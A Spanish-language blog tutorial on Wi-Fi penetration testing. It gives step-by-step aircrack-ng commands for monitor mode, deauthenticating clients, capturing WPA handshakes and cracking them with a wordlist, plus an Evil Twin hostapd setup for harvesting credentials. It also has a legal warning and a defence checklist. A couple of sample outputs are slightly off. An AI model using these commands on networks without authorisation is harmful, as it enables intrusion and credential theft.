---
title: "Wi-Fi hacking: cómo auditar redes inalámbricas"
description: "Aircrack-ng, handshake captures, Evil Twin y defensa de redes WiFi"
author: Equipo CDPN
date: 2026-08-31
tags: [wifi, aircrack, wireless, redes, hacking]
readingTime: 5 min
---

<script setup>
import { useData } from 'vitepress'
const { frontmatter } = useData()
</script>

<style>
.article-meta { display:flex; gap:0.8rem; flex-wrap:wrap; margin:0.8rem 0 1.5rem; font-size:0.85rem; color:var(--vp-c-text-3); }
.article-meta span { background:var(--vp-c-default-soft); padding:2px 10px; border-radius:6px; }
.article-meta .accent { background:var(--vp-c-brand-soft); color:var(--vp-c-brand-1); }
</style>

# Wi-Fi hacking: cómo auditar redes inalámbricas

<div class="article-meta">
  <span class="accent">📝 Equipo CDPN</span>
  <span>📅 31 Agosto 2026</span>
  <span>📖 5 min de lectura</span>
  <span>🏷️ Wi-Fi</span>
  <span>🏷️ Aircrack-ng</span>
</div>

## ¿Por qué aprender Wi-Fi hacking?

El **80% de las redes Wi-Fi** tienen vulnerabilidades configuracionales. Auditar redes inalámbricas es una habilidad esencial para pentesters y administradores de red.

> ⚠️ **Aviso legal:** Solo audita redes donde tengas permiso explícito por escrito. Acceder a redes ajenas es ilegal.

## Herramientas necesarias

```bash
# Instalar suite completa
sudo apt install aircrack-ng

# Verificar que tu tarjeta soporta modo monitor
airmon-ng
```

### Tarjetas WiFi recomendadas

| Tarjeta | Chipset | Monitor Mode | Inyección | Precio |
|---------|---------|:---:|:---:|--------|
| **Alfa AWUS036ACH** | Realtek RTL8812AU | ✅ | ✅ | ~€30 |
| **Alfa AWUS036ACSM** | Realtek RTL8812AU | ✅ | ✅ | ~€35 |
| **TP-Link TL-WN722N v1** | Atheros AR9271 | ✅ | ✅ | ~€15 |
| **Panda PAU09** | Ralink RT5572 | ✅ | ✅ | ~€20 |

## Flujo de ataque completo

### Paso 1: Modo monitor

```bash
# Identificar interfaz
iwconfig

# Activar modo monitor
sudo airmon-ng start wlan0

# Verificar (debería decir "monitor mode")
iwconfig wlan0mon
```

### Paso 2: Escaneo de redes

```bash
# Capturar tráfico de todas las redes
sudo airodump-ng wlan0mon

# Salida:
# BSSID              PWR  Beacons  #Data  CH  ENC   ESSID
# AA:BB:CC:DD:EE:FF  -45  234      1567   6   WPA2  MiWiFi
# 11:22:33:44:55:66  -67  89       234    11  WPA2  Oficina
```

### Paso 3: Capturar handshake

```bash
# Atacar una red específica
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# En otra terminal, deautenticar clientes para forzar reconnect
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Cuando captures el "WPA handshake: AA:BB:CC:CC:DD:EE:FF"
# Presiona Ctrl+C
```

### Paso 4: Crackear la contraseña

```bash
# Con wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Si la contraseña está en el wordlist, la mostrará:
# KEY FOUND! [ password123 ]
```

## Ataque Evil Twin (AP Falso)

```bash
# Crear punto de acceso falso idéntico a la red objetivo
# 1. Crear AP con el mismo nombre (ESSID)
sudo hostapd evil-twin.conf

# 2. Redirigir tráfico a tu servidor
# 3. Capturar credenciales que los usuarios introduzcan

# Herramientas automatizadas:
# - Wifiphisher
# - Fluxion
# - Airgeddon
```

### Configuración hostapd

```ini
# evil-twin.conf
interface=wlan1
driver=nl80211
ssid=MiWiFi
hw_mode=g
channel=6
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
```

## Ataques WPA3

```bash
# WPA3 usa SAE (Simultaneous Authentication of Equals)
# Es mucho más resistente a ataques de diccionario

# Ataque Dragonblood (vulnerabilidades conocidas):
# - Dragonblood (side-channel attack)
# - Cache-based attack
# - Timing-based attack

# En la práctica: WPA3 es significativamente más seguro
# El handshake capture + dictionary NO funciona igual
```

## Defensa de redes WiFi

```
✅ Usar WPA3 (o WPA2-AES como mínimo)
✅ Contraseñas largas (20+ caracteres, random)
✅ Cambiar SSID por defecto del router
✅ Deshabilitar WPS (WiFi Protected Setup)
✅ Actualizar firmware del router
✅ Usar 802.1X (Enterprise) para empresas
✅ Segmentar red (guest network separada)
✅ Monitorear clientes conectados regularmente
```

### Generar contraseñas seguras

```bash
# Generar contraseña de 25 caracteres
openssl rand -base64 25
# Ejemplo: k8Fj2mN5xP3qR7vB9wL4cY6tA1sD0gH2

# Longitud mínima recomendada: 20 caracteres
# Caracteres: mayúsculas + minúsculas + números + símbolos
```

## Conclusión

Wi-Fi hacking demuestra que **la seguridad de la red depende de la contraseña**. Una contraseña débil de 8 caracteres se crackea en minutos. Una de 25 caracteres random es prácticamente indestructible.

---

*Artículo publicado en el Blog CDPN — Semana 14*
